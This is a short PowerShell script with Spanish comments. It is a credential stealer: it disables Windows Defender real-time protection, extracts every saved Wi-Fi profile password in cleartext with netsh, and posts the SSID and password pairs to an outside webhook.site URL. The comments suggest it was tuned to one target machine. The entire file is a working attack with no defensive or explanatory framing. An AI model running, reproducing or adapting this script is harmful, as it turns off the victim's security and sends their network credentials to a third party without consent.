# 1. Desactivar Defender (Ya sabemos que esto te funciona)
Set-MpPreference -DisableRealtimeMonitoring $true -EA 0

# 2. Pausa de 2 segundos para asegurar que el sistema no bloquee el siguiente comando
Start-Sleep -s 2

# 3. Obtener perfiles de Wi-Fi
$profiles = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() } | Where-Object { $_ -notmatch "Profile" }

# 4. Extraer claves y guardarlas en una lista
$wifiList = foreach ($name in $profiles) {
    $n = $name
    # Buscamos específicamente "Key Content" (Ya que tu PC está en inglés)
    $pass = netsh wlan show profile name="$n" key=clear | Select-String "Key Content\W+:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    
    if ($pass) {
        "SSID: $n | Pass: $pass"
    }
}

# 5. Enviar al Webhook
if ($wifiList) {
    $resultString = $wifiList -join "`n"
    Invoke-RestMethod -Uri "https://webhook.site/8fae434e-1ec5-4dce-94e3-d1bf51a78a9c" -Method Post -Body $resultString -UseBasicParsing
}
